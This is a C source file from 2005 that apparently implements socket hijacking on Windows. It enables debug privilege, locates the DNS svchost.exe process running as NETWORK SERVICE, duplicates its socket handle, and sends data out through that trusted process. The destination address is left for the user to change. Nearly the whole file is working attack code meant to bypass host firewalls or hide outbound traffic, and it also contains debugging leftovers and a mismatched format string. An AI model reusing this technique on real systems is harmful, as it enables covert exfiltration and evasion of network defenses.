/*++

  Made By ZwelL
  zwell@sohu.com
  2005.4.12
--*/

#include <winsock2.h>
#include <stdio.h>
#include <wtsapi32.h>

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "wtsapi32")

#define NT_SUCCESS(status)          ((NTSTATUS)(status)>=0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef LONG    NTSTATUS;

typedef struct _SYSTEM_HANDLE_INFORMATION
{

    ULONG				ProcessId;
    UCHAR				ObjectTypeNumber;
    UCHAR				Flags;
    USHORT				Handle;
    PVOID				Object;
    ACCESS_MASK			GrantedAccess;

} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef ULONG (WINAPI *ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);

ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;

BOOL LocateNtdllEntry ( void )
{
    BOOL    ret         = FALSE;
    char    NTDLL_DLL[] = "ntdll.dll";
    HMODULE ntdll_dll   = NULL;


    if ( ( ntdll_dll = GetModuleHandle( NTDLL_DLL ) ) == NULL )
    {
        printf( "GetModuleHandle() failed");
        return( FALSE );
    }

    if ( !( ZwQuerySystemInformation = 
		( ZWQUERYSYSTEMINFORMATION )GetProcAddress( ntdll_dll,
		"ZwQuerySystemInformation" ) ) )
    {
        goto LocateNtdllEntry_exit;
    }

    ret = TRUE;

LocateNtdllEntry_exit:

    if ( FALSE == ret )
    {
        printf( "GetProcAddress() failed");
    }

    ntdll_dll = NULL;

    return( ret );
}


/*++
This routine is used to get a process's username from it's SID
--*/
BOOL GetUserNameFromSid(PSID pUserSid, char *szUserName)
{
    // sanity checks and default value
    if (pUserSid == NULL)
	{
        return false;
	}
	
    strcpy(szUserName, "?");

    SID_NAME_USE   snu;
	
    TCHAR          szUser[_MAX_PATH]	= {0};
    DWORD          chUser				= _MAX_PATH;
    PDWORD         pcchUser				= &chUser; 
    TCHAR          szDomain[_MAX_PATH]	= {0};
    DWORD          chDomain				= _MAX_PATH;
    PDWORD         pcchDomain			= &chDomain;

    // Retrieve user name and domain name based on user's SID.
	BOOL bResult = ::LookupAccountSid( NULL, 
									   pUserSid, 
									   szUser, 
									   pcchUser, 
									   szDomain, 
									   pcchDomain, 
									   &snu );
    if ( bResult )
    {
        wsprintf(szUserName, "%s", szUser);
    }
    else
    {
        return false;
    }

    return true;
}  


/*++

This routine is used to get the DNS process's Id
  
Here, I use WTSEnumerateProcesses to get process user Sid, 
and then get the process user name. Beacause as it's a "NETWORK SERVICE", 
we cann't use OpenProcessToken to catch the DNS process's token information,
even if we has the privilege in catching the SYSTEM's.

--*/
DWORD GetDNSProcessId()
{
	//直接控制DNS进程(就是svchost.exe,对应用户名是NETWORK SERVICE)进行数据传输
    PWTS_PROCESS_INFO pProcessInfo = NULL;

    DWORD             ProcessCount = 0;
    char              szUserName[255];
    DWORD             Id = -1;

    if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &ProcessCount))
    {
		printf( "GetDNSProcessId WTSEnumerateProcesses success ProcessCount = %d\n\r",
			    ProcessCount );
		::MessageBox( NULL, "", "", MB_OK );
		
        // dump each process description
        for (DWORD CurrentProcess = 0; CurrentProcess < ProcessCount; CurrentProcess++)
        {

			printf( "GetDNSProcessId WTSEnumerateProcesses success ProcessCount = %s\n\r",
			        pProcessInfo[CurrentProcess].pProcessName );
			::MessageBox( NULL, "", "", MB_OK );

			
            if( strcmp(pProcessInfo[CurrentProcess].pProcessName, "svchost.exe") == 0 )
            {
				//如果svchost.exe
                GetUserNameFromSid(pProcessInfo[CurrentProcess].pUserSid, szUserName);


				printf( "GetDNSProcessId GetUserNameFromSid success szUserName = %s\n\r",
					    szUserName );
				::MessageBox( NULL, "", "", MB_OK );

				
                if( strcmp(szUserName, "NETWORK SERVICE") == 0)
                {
                    Id = pProcessInfo[CurrentProcess].ProcessId;


					printf( "GetDNSProcessId return Id = %s\n\r",
						    Id );
					::MessageBox( NULL, "", "", MB_OK );
				
					
                    break;
                }
            }
        }

        WTSFreeMemory(pProcessInfo);
    }
	else
	{
		printf( "GetDNSProcessId WTSEnumerateProcesses fail %d\n\r",
			    GetLastError() );
		::MessageBox( NULL, "", "", MB_OK );
	}

    return Id;
}


/*++
This doesn't work as we know, sign...
but you can use the routine for other useing...
--*/
/*
BOOL GetProcessUserFromId(char *szAccountName, DWORD PID)
{
    HANDLE hProcess = NULL, 
            hAccessToken = NULL;
    TCHAR InfoBuffer[1000], szDomainName[200];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)InfoBuffer;
    DWORD dwInfoBufferSize,dwAccountSize = 200, dwDomainSize = 200;
    SID_NAME_USE snu;

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);
    if(hProcess == NULL)
    {
        printf("OpenProcess wrong");
        CloseHandle(hProcess);
        return false;
    }

    if(0 == OpenProcessToken(hProcess,TOKEN_QUERY,&hAccessToken))
    {
        printf("OpenProcessToken wrong:%08x", GetLastError());
        return false;
    }

    GetTokenInformation(hAccessToken,TokenUser,InfoBuffer,
        1000, &dwInfoBufferSize);

    LookupAccountSid(NULL, pTokenUser->User.Sid, szAccountName,
        &dwAccountSize,szDomainName, &dwDomainSize, &snu);

    if(hProcess)
        CloseHandle(hProcess);
    if(hAccessToken)
        CloseHandle(hAccessToken);
    return true;
}*/


/*++
Now, it is the most important stuff... ^_^
--*/
SOCKET GetSocketFromId (DWORD PID)
{
    NTSTATUS						status;
    PVOID							buf			= NULL;
    ULONG							size		= 1;
    ULONG							NumOfHandle = 0;
    ULONG							i;
    PSYSTEM_HANDLE_INFORMATION		h_info		= NULL;
    HANDLE							sock		= NULL;
    DWORD							n;

    buf = malloc(0x1000);

    if(buf == NULL)
    {
        printf("malloc wrong\n");

        return NULL;
    }

    status = ZwQuerySystemInformation( 0x10, buf, 0x1000, &n );

    if(STATUS_INFO_LENGTH_MISMATCH == status)
    {
        free(buf);

        buf=malloc(n);

        if(buf == NULL)
        {
            printf("malloc wrong\n");
            return NULL;
        }

        status = ZwQuerySystemInformation( 0x10, buf, n, NULL);
    }
    else
    {
        printf("ZwQuerySystemInformation wrong\n");
        return NULL;
    }

    NumOfHandle = *(ULONG*)buf;

    h_info = ( PSYSTEM_HANDLE_INFORMATION )((ULONG)buf+4);

    for(i = 0; i<NumOfHandle ;i++)
    {
        try
        {
            if( ( h_info[i].ProcessId == PID )
				&& ( h_info[i].ObjectTypeNumber == 0x1c ) 
                && (h_info[i].Handle != 0x2c)    // I don't know why if the Handle equal to 0x2c, in my test, it stops at getsockname()
                                            // So I jump over this situation... 
                                            // May be it's different in your system, 
                ) //wind2000 is 0x1a
            {
                //printf("Handle:0x%x Type:%08x\n",h_info[i].Handle, h_info[i].ObjectTypeNumber);
				//用DuplicateHandle()函数将其SOCKET转换为能被自己使用
                if( 0 == DuplicateHandle( OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID), 
										  (HANDLE)h_info[i].Handle,
										  GetCurrentProcess(), 
										  &sock, 
										  STANDARD_RIGHTS_REQUIRED, 
										  true, 
										  DUPLICATE_SAME_ACCESS) )
                {
                    printf("DuplicateHandle wrong:%8x", GetLastError());
                    continue;
                }

                //printf("DuplicateHandle ok\n");
                sockaddr_in name = {0};
                name.sin_family = AF_INET;
                int namelen = sizeof(sockaddr_in);
                getsockname( (SOCKET)sock, (sockaddr*)&name, &namelen );
                //printf("PORT=%5d\n",    ntohs( name.sin_port )); 
                if(ntohs(name.sin_port)>0)    // if port > 0, then we can use it
                    break;
            }
        }
        catch(...)
        {
            continue;
        }
    }

    if ( buf != NULL )
    {
        free( buf );
    }
    return (SOCKET)sock;
}


/*++
This is not required...
--*/
BOOL EnablePrivilege (PCSTR name)
{
    HANDLE hToken;
    BOOL rv;

    TOKEN_PRIVILEGES priv = { 1, {0, 0, SE_PRIVILEGE_ENABLED} };

    LookupPrivilegeValue (
        0,
        name,
        &priv.Privileges[0].Luid
        );

    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    OpenProcessToken(
        GetCurrentProcess (),
        TOKEN_ADJUST_PRIVILEGES,
        &hToken
        );

    AdjustTokenPrivileges (
        hToken,
        FALSE,
        &priv,
        sizeof priv,
        0,
        0
        );

    rv = GetLastError () == ERROR_SUCCESS;

    CloseHandle (hToken);
    return rv;
}

void main() 
{
    WSADATA wsaData;
    char    testbuf[255] = {0};
    SOCKET    sock;
    sockaddr_in RecvAddr;

    int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != NO_ERROR)
        printf("Error at WSAStartup()\n");

    if(!LocateNtdllEntry())			/////load ZwQuerySystemInformation函数
	{
        return;
	}

    if(!EnablePrivilege (SE_DEBUG_NAME))
    {
        printf("EnablePrivilege wrong\n");
        return;
    }

    sock = GetSocketFromId(GetDNSProcessId());
    if( sock==NULL)
    {
        printf("GetSocketFromId wrong\n");
        return;
    }

    //Change there value...
    RecvAddr.sin_family = AF_INET;
    RecvAddr.sin_port = htons(5555); 
    RecvAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if(SOCKET_ERROR == sendto(sock, 
            "test", 
            5, 
            0, 
            (SOCKADDR *) &RecvAddr, 
            sizeof(RecvAddr)))
    {
        printf("sendto wrong:%d\n", WSAGetLastError());
    }
    else
    {
        printf("send ok... Have fun, right? ^_^\n");
    }
    
    getchar();

    //WSACleanup();
    return;
}
